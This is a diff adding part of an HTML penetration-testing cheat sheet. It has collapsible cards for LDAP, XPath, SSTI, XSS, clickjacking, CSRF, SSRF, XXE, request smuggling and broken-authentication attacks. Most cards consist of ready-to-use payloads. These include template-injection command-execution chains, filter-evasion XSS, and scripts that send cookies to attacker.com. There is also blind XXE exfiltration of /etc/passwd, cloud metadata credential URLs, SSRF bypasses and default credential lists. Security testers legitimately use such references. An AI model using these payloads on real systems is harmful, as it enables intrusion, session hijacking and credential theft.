+// Full LDAP filter bypass
+user=*)(|(cn=*)
+pass=))%00
+
+// Extract all users
+*)(|(cn=*))%00
+*))%00
+
+// DN injection
+admin)(|(userPassword=*)
+*)(objectclass=*))(|(objectclass=*</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">ldap-brute</span><span class="tool-badge">OWASP ZAP</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Authentication bypass</li><li>Directory enumeration</li><li>Credential harvesting</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://owasp.org/www-community/attacks/LDAP_Injection" target="_blank">OWASP LDAP Injection</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" target="_blank">PayloadsAllTheThings - LDAP</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V5: XPATH INJECTION ==================== -->
+<div class="vuln-card" id="v5">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">05</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">XPATH / XML INJECTION</div>
+      <div class="vuln-short">Injecting into XPath expressions or XML parsers to bypass auth or extract data.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Detection Payloads</div>
+<div class="code-block">'
+"
+'or '1'='1
+' or '1'='1
+" or "1"="1
+' or ''='
+x' or 1=1 or 'x'='y
+' and count(/*)=1 and '1'='1</div>
+    <div class="section-label">Authentication Bypass</div>
+<div class="code-block orange">// XPath 1.0 bypass
+' or '1'='1
+' or 1=1 or ''='
+") or "1"="1
+admin' or '1'='1
+
+// Extract node names
+' or name()='user' or '1'='
+' and substring(name(/*[1]),1,1)='u' or '1'='</div>
+    <div class="section-label">XML Entity Injection</div>
+<div class="code-block red">// Detect XML parsing
+<?xml version="1.0"?>
+<!DOCTYPE test [<!ENTITY test SYSTEM "file:///etc/passwd">]>
+<user>&test;</user>
+
+// SSRF via XXE (see XXE section for full list)</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">xcat</span><span class="tool-badge">OWASP ZAP</span></div>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://owasp.org/www-community/attacks/XPATH_Injection" target="_blank">OWASP XPath Injection</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection" target="_blank">PayloadsAllTheThings - XPath</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V6: SSTI ==================== -->
+<div class="vuln-card" id="v6">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">06</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">SERVER-SIDE TEMPLATE INJECTION (SSTI)</div>
+      <div class="vuln-short">Injecting template syntax that is evaluated by the server-side template engine.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>URL Parameters</li><li>Form Fields</li><li>Email Templates</li><li>User Profile fields</li><li>Error Pages</li><li>Headers (User-Agent)</li></ul>
+    <div class="section-label">Detection - Identify Engine</div>
+<div class="code-block">// Generic polyglot detection (inject and observe output)
+{{7*7}}                → 49 (Jinja2/Twig)
+${7*7}                 → 49 (FreeMarker/Thymeleaf)
+<%= 7*7 %>             → 49 (ERB/Ruby)
+#{7*7}                 → 49 (Ruby)
+*{7*7}                 → 49 (Thymeleaf)
+{{7*'7'}}              → 7777777 (Jinja2) vs 49 (Twig)
+${{7*7}}
+{{config}}             → Jinja2 config dump
+#{T(java.lang.Runtime).getRuntime()}</div>
+    <div class="section-label">Exploitation by Engine</div>
+    <div class="payload-group"><div class="payload-title">Jinja2 (Python/Flask)</div>
+<div class="code-block red">{{config}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__']['__import__']('os').system('id')}}{%endif%}{%endfor%}</div></div>
+    <div class="payload-group"><div class="payload-title">Twig (PHP)</div>
+<div class="code-block orange">{{7*7}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('passthru')}}
+{{app.request.server.all|join(',')}}
+{%set a='id'%}{{a|system}}</div></div>
+    <div class="payload-group"><div class="payload-title">FreeMarker (Java)</div>
+<div class="code-block purple">${"freemarker.template.utility.Execute"?new()("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}</div></div>
+    <div class="payload-group"><div class="payload-title">ERB (Ruby)</div>
+<div class="code-block"><%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read %></div></div>
+    <div class="payload-group"><div class="payload-title">Velocity (Java)</div>
+<div class="code-block green">#set($x='')##
+#set($rt = $x.class.forName('java.lang.Runtime'))
+#set($chr = $x.class.forName('java.lang.Character'))
+#set($str = $x.class.forName('java.lang.String'))
+#set($ex=$rt.getRuntime().exec('id'))
+$ex.waitFor()
+#set($out = $ex.getInputStream())
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</div></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">tplmap</span><span class="tool-badge">Burp Suite</span><span class="tool-badge">SSTImap</span></div>
+<div class="code-block green">tplmap -u "http://target.com/page?name=INJECT"
+sstimap -u "http://target.com/?tmpl=INJECT" --os-shell</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Remote Code Execution</li><li>Full server takeover</li><li>File read/write</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">PortSwigger SSTI</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank">PayloadsAllTheThings - SSTI</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V7: REFLECTED XSS ==================== -->
+<div class="vuln-card" id="v7">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">07</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">REFLECTED XSS</div>
+      <div class="vuln-short">Malicious script reflected from server in the HTTP response, executed in victim's browser.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>URL Parameters</li><li>Search Fields</li><li>Error Messages</li><li>Referrer Header</li><li>User-Agent</li><li>Redirect params</li></ul>
+    <div class="section-label">Detection Payloads</div>
+<div class="code-block">// Basic detection - look for reflection in source
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+javascript:alert(1)
+<svg onload=alert(1)>
+'';!--"<XSS>=&{()}
+%3Cscript%3Ealert(1)%3C/script%3E  // URL encoded</div>
+    <div class="section-label">Context-Aware Payloads</div>
+    <div class="payload-group"><div class="payload-title">HTML Context</div>
+<div class="code-block orange"><script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<svg/onload=alert(1)>
+<iframe onload=alert(1)></iframe>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)></div></div>
+    <div class="payload-group"><div class="payload-title">Attribute Context (inside an attribute)</div>
+<div class="code-block">" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+' onclick='alert(1)
+" style="animation-name:spinning" onanimationstart="alert(1)</div></div>
+    <div class="payload-group"><div class="payload-title">JavaScript Context</div>
+<div class="code-block purple">'-alert(1)-'
+';alert(1)//
+\';alert(1)//
+</script><script>alert(1)</script>
+"-alert(1)-"</div></div>
+    <div class="payload-group"><div class="payload-title">WAF Bypass Payloads</div>
+<div class="code-block red"><ScRiPt>alert(1)</ScRiPt>
+<script>alert`1`</script>
+<img src=x oNeRrOr=alert(1)>
+<svg onload=&#97;lert(1)>
+<svg onload=alert&#40;1&#41;>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+<a href="java&#115;cript:alert(1)">click</a>
+<svg><script>alert(1)</script></svg>
+<<script>alert(1)//<</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<math><a xlink:href="javascript:alert(1)">click</a></math></div></div>
+    <div class="payload-group"><div class="payload-title">Cookie Stealing Payload</div>
+<div class="code-block green"><script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+<img src=x onerror="fetch('http://attacker.com/steal?c='+btoa(document.cookie))">
+<svg onload="new Image().src='http://attacker.com/?c='+document.cookie"></div></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">XSStrike</span><span class="tool-badge">OWASP ZAP</span><span class="tool-badge">dalfox</span><span class="tool-badge">XSSer</span></div>
+<div class="code-block green">xsstrike -u "http://target.com/search?q=INJECT"
+dalfox url "http://target.com/search?q=INJECT"</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Session hijacking</li><li>Cookie theft</li><li>Phishing / defacement</li><li>Keylogging</li><li>Credential harvesting</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger XSS Labs</a></li>
+      <li><a href="https://github.com/payloadbox/xss-payload-list" target="_blank">PayloadBox XSS List</a></li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" target="_blank">OWASP XSS Filter Evasion</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V8: STORED XSS ==================== -->
+<div class="vuln-card" id="v8">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">08</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">STORED XSS (Persistent)</div>
+      <div class="vuln-short">Malicious script stored in database and served to all users who view the infected content.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>Comments / Forums</li><li>User Profile fields</li><li>Product Reviews</li><li>Admin Panels</li><li>Log viewers</li><li>File names</li></ul>
+    <div class="section-label">Key Payloads</div>
+<div class="code-block orange"><script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+
+// Blind XSS (fire when admin views logs)
+"><script src=//attacker.com/xss.js></script>
+<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','//attacker.com/?c='+document.cookie);x.send()">
+
+// Polyglot
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+// XSS via file upload (SVG)
+// Upload a .svg file containing:
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
+  <rect width="300" height="100" style="fill:rgb(0,0,255)"/>
+</svg></div>
+    <div class="section-label">Blind XSS Tools</div>
+    <div class="tools-row"><span class="tool-badge">XSS Hunter</span><span class="tool-badge">Burp Collaborator</span><span class="tool-badge">CanaryTokens</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Mass session hijacking</li><li>Admin account takeover</li><li>Worm propagation</li><li>Site-wide defacement</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/cross-site-scripting/stored" target="_blank">PortSwigger Stored XSS</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V9: DOM XSS ==================== -->
+<div class="vuln-card" id="v9">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">09</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">DOM-BASED XSS</div>
+      <div class="vuln-short">Payload executed through client-side script DOM manipulation without server reflection.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Common Sources (Attacker Controls)</div>
+    <div class="field-row"><strong>DOM Sources</strong>document.URL, document.location, document.referrer, window.location.hash, window.location.search, document.cookie, localStorage, sessionStorage, postMessage data</div>
+    <div class="section-label">Common Sinks (Dangerous Functions)</div>
+    <div class="field-row"><strong>DOM Sinks</strong>document.write(), innerHTML, outerHTML, eval(), setTimeout(), setInterval(), Function(), document.domain, element.src, element.href, location.href</div>
+    <div class="section-label">Detection & Exploitation</div>
+<div class="code-block orange">// URL hash-based
+http://target.com/page#<img src=x onerror=alert(1)>
+http://target.com/page#<svg onload=alert(1)>
+
+// location.search-based
+http://target.com/page?search=<script>alert(1)</script>
+
+// postMessage-based
+// Craft a malicious page that sends:
+window.opener.postMessage("<img src=x onerror=alert(1)>","*")
+
+// AngularJS sandbox escape
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+
+// DOM clobbering
+<form id=x><input id=attributes></form></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">DOM Invader (Burp)</span><span class="tool-badge">DOMDigger</span><span class="tool-badge">JSShell</span></div>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">PortSwigger DOM XSS</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V10: CLICKJACKING ==================== -->
+<div class="vuln-card" id="v10">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">10</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">CLICKJACKING</div>
+      <div class="vuln-short">Tricking users into clicking invisible iframed elements to perform unintended actions.</div>
+    </div>
+    <div class="severity-badge sev-medium">MEDIUM</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Detection</div>
+    <div class="field-row"><strong>Check Response Headers</strong>Missing X-Frame-Options header<br>Missing Content-Security-Policy: frame-ancestors directive<br>Test: try embedding target in an iframe</div>
+<div class="code-block">// Test PoC - save as HTML and open
+<html>
+<head><style>
+iframe {
+  width:500px; height:700px;
+  position:absolute; top:-100px; left:-200px;
+  opacity:0.0001; z-index:2;
+}
+button {
+  position:absolute; top:300px; left:100px; z-index:1;
+}
+</style></head>
+<body>
+  <button>CLICK ME - WIN A PRIZE!</button>
+  <iframe src="https://target.com/delete-account"></iframe>
+</body>
+</html></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">clickjacker.py</span><span class="tool-badge">OWASP ZAP</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Forced actions (delete, transfer)</li><li>Social engineering attacks</li><li>XSS delivery</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/clickjacking" target="_blank">PortSwigger Clickjacking</a></li>
+      <li><a href="https://owasp.org/www-community/attacks/Clickjacking" target="_blank">OWASP Clickjacking</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V11: CSRF ==================== -->
+<div class="vuln-card" id="v11">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">11</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">CROSS-SITE REQUEST FORGERY (CSRF)</div>
+      <div class="vuln-short">Forces an authenticated user to execute unwanted actions on a web application.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>State-changing actions</li><li>Password change</li><li>Email change</li><li>Money transfer</li><li>Profile update</li><li>Delete actions</li></ul>
+    <div class="section-label">Detection</div>
+    <div class="field-row"><strong>Check for</strong>
+Absence of CSRF token in forms<br>
+Predictable / reusable CSRF tokens<br>
+Token not validated server-side<br>
+CSRF token in URL (leaks in Referrer)<br>
+Missing SameSite cookie attribute</div>
+    <div class="section-label">Exploitation PoC</div>
+    <div class="payload-group"><div class="payload-title">GET-based CSRF</div>
+<div class="code-block orange">// Victim visits attacker page, this fires automatically
+<img src="https://target.com/transfer?to=attacker&amount=1000">
+<iframe src="https://target.com/delete-account?confirm=yes"></iframe></div></div>
+    <div class="payload-group"><div class="payload-title">POST-based CSRF (Auto-Submit Form)</div>
+<div class="code-block red"><!DOCTYPE html>
+<html>
+<body onload="document.forms[0].submit()">
+  <form action="https://target.com/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com">
+    <input type="hidden" name="confirm_email" value="attacker@evil.com">
+  </form>
+</body>
+</html></div></div>
+    <div class="payload-group"><div class="payload-title">CSRF Token Bypass Techniques</div>
+<div class="code-block purple">// 1. Delete CSRF token parameter entirely
+// 2. Use another user's valid CSRF token
+// 3. Change POST to GET (token validated only on POST)
+// 4. Double submit cookie bypass - set your own cookie
+// 5. Token tied to session but not to action - replay in different action
+// 6. SameSite=None without Secure flag
+// 7. Referer header bypass - add ?target.com to attacker URL
+//    http://attacker.com/?victim.com</div></div>
+    <div class="payload-group"><div class="payload-title">JSON CSRF (Content-Type bypass)</div>
+<div class="code-block"><form enctype="text/plain" action="https://target.com/api/update" method="POST">
+  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
+</form></div></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite (CSRF PoC generator)</span><span class="tool-badge">OWASP ZAP</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Account takeover</li><li>Unauthorized fund transfer</li><li>Data modification</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/csrf" target="_blank">PortSwigger CSRF Labs</a></li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">OWASP CSRF Prevention</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V12: SSRF ==================== -->
+<div class="vuln-card" id="v12">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">12</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">SERVER-SIDE REQUEST FORGERY (SSRF)</div>
+      <div class="vuln-short">Making the server issue requests to unintended internal or external resources.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>URL parameters</li><li>Webhook URLs</li><li>PDF generators</li><li>Image fetch</li><li>Import features</li><li>Proxy params</li></ul>
+    <div class="section-label">Detection Payloads</div>
+<div class="code-block">// Internal service probing
+http://127.0.0.1/
+http://localhost/
+http://0.0.0.0/
+http://[::1]/
+http://169.254.169.254/  (AWS metadata)
+http://192.168.0.1/
+http://10.0.0.1/
+
+// Out-of-band detection
+http://burp-collaborator.com/
+http://attacker.com/ssrf-test</div>
+    <div class="section-label">Exploitation Payloads</div>
+    <div class="payload-group"><div class="payload-title">Cloud Metadata Endpoints</div>
+<div class="code-block orange">// AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+// GCP
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+// Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+// DigitalOcean
+http://169.254.169.254/metadata/v1/</div></div>
+    <div class="payload-group"><div class="payload-title">Protocol Schemes</div>
+<div class="code-block purple">file:///etc/passwd
+file:///etc/hosts
+file:///proc/self/environ
+dict://127.0.0.1:6379/info        (Redis)
+gopher://127.0.0.1:6379/_INFO%0D%0A  (Redis via Gopher)
+ftp://127.0.0.1:21/
+sftp://attacker.com:11111/
+tftp://attacker.com/test
+ldap://127.0.0.1:389/
+http://127.0.0.1:8080/admin
+http://127.0.0.1:8500/v1/kv/     (Consul)
+http://127.0.0.1:5601             (Kibana)
+http://127.0.0.1:9200/_cat/indices (Elasticsearch)</div></div>
+    <div class="payload-group"><div class="payload-title">Bypass Techniques</div>
+<div class="code-block red">// Decimal IP
+http://2130706433/  (127.0.0.1)
+// Octal IP
+http://0177.0.0.1/
+// Hex IP
+http://0x7f000001/
+// IPv6
+http://[::ffff:127.0.0.1]/
+// URL shortener (redirect)
+http://bit.ly/ssrf-test → redirects to 127.0.0.1
+// DNS rebinding
+http://1u.ms/127.0.0.1/
+// Double encoding
+http://127。0.0.1/ (Unicode dot)
+// Open redirect chained with SSRF
+/redirect?url=http://169.254.169.254/</div></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite + Collaborator</span><span class="tool-badge">SSRFmap</span><span class="tool-badge">Gopherus</span><span class="tool-badge">interactsh</span></div>
+<div class="code-block green">ssrfmap -r request.txt -p url --module readfiles
+gopherus --exploit redis  # Generate gopher payload for Redis</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Internal network scanning</li><li>Cloud credential theft</li><li>Internal service exploitation</li><li>RCE via metadata service</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/ssrf" target="_blank">PortSwigger SSRF Labs</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank">PayloadsAllTheThings - SSRF</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V13: XXE ==================== -->
+<div class="vuln-card" id="v13">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">13</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">XML EXTERNAL ENTITY (XXE)</div>
+      <div class="vuln-short">XML input processed with external entity references enabled, allowing file read and SSRF.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>XML POST requests</li><li>SOAP endpoints</li><li>File upload (docx/xlsx/svg)</li><li>APIs accepting XML</li><li>Content-Type: application/xml</li></ul>
+    <div class="section-label">Basic XXE Payloads</div>
+<div class="code-block orange">// File read
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+// Windows
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<root>&xxe;</root>
+
+// /etc/hosts
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
+<stockCheck><productId>&xxe;</productId></stockCheck></div>
+    <div class="section-label">Advanced XXE Payloads</div>
+    <div class="payload-group"><div class="payload-title">SSRF via XXE</div>
+<div class="code-block purple"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<root>&xxe;</root>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>
+<root>&xxe;</root></div></div>
+    <div class="payload-group"><div class="payload-title">Blind XXE (Out-of-Band Exfil)</div>
+<div class="code-block red">// Attacker hosts evil.dtd at http://attacker.com/evil.dtd:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
+%eval;
+%exfil;
+
+// Payload sent to target:
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+<foo>test</foo></div></div>
+    <div class="payload-group"><div class="payload-title">XXE via SVG Upload</div>
+<div class="code-block">// Upload as .svg file
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+<text font-size="16" x="0" y="16">&xxe;</text>
+</svg></div></div>
+    <div class="payload-group"><div class="payload-title">XXE via DOCX/XLSX/PDF</div>
+<div class="code-block green">// Unzip docx, edit word/document.xml, inject XXE, rezip
+// OR inject into xl/workbook.xml for XLSX</div></div>
+    <div class="payload-group"><div class="payload-title">Parameter Entity (when regular blocked)</div>
+<div class="code-block purple"><!DOCTYPE foo [
+  <!ENTITY % a "<!ENTITY b SYSTEM 'http://attacker.com/'>">
+  %a;
+]>
+<root>&b;</root></div></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">XXEinjector</span><span class="tool-badge">Burp Collaborator</span></div>
+<div class="code-block green">python XXEinjector.py --host=attacker.com --path=/etc/passwd --file=req.txt</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Arbitrary file read</li><li>SSRF / internal network access</li><li>DoS (billion laughs)</li><li>Data exfiltration</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/xxe" target="_blank">PortSwigger XXE Labs</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank">PayloadsAllTheThings - XXE</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V14: HTTP REQUEST SMUGGLING ==================== -->
+<div class="vuln-card" id="v14">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">14</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">HTTP REQUEST SMUGGLING</div>
+      <div class="vuln-short">Desync between front-end and back-end servers using conflicting Content-Length / Transfer-Encoding.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Detection Payloads</div>
+    <div class="payload-group"><div class="payload-title">CL.TE (Content-Length takes priority at front-end)</div>
+<div class="code-block orange">POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+X</div></div>
+    <div class="payload-group"><div class="payload-title">TE.CL (Transfer-Encoding takes priority at front-end)</div>
+<div class="code-block red">POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+1
+Z
+Q</div></div>
+    <div class="payload-group"><div class="payload-title">TE.TE (Obfuscated Transfer-Encoding headers)</div>
+<div class="code-block purple">Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+ : chunked</div></div>
+    <div class="payload-group"><div class="payload-title">Exploit: Bypass Front-End Security Controls</div>
+<div class="code-block">POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /admin HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1</div></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp HTTP Request Smuggler</span><span class="tool-badge">smuggler.py</span><span class="tool-badge">h2csmuggler</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Bypass security controls</li><li>Session hijacking</li><li>XSS delivery</li><li>Cache poisoning</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/request-smuggling" target="_blank">PortSwigger HTTP Smuggling</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V15: BROKEN AUTH ==================== -->
+<div class="vuln-card" id="v15">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">15</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">BROKEN AUTHENTICATION</div>
+      <div class="vuln-short">Weaknesses in session management, credential handling, and authentication mechanisms.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Test Areas</div>
+    <ul class="location-list"><li>Login form</li><li>Password reset</li><li>Remember me</li><li>Session tokens</li><li>MFA bypass</li><li>Account lockout</li></ul>
+    <div class="section-label">Testing Techniques & Payloads</div>
+    <div class="payload-group"><div class="payload-title">Default Credentials</div>
+<div class="code-block orange">admin:admin
+admin:password
+admin:admin123
+admin:123456
+root:root
+root:toor
+guest:guest
+test:test
+user:user
+administrator:administrator</div></div>
+    <div class="payload-group"><div class="payload-title">Username Enumeration</div>
+<div class="code-block">// Observe response differences:
+// - Timing differences
+// - Different HTTP status codes
+// - Different error messages
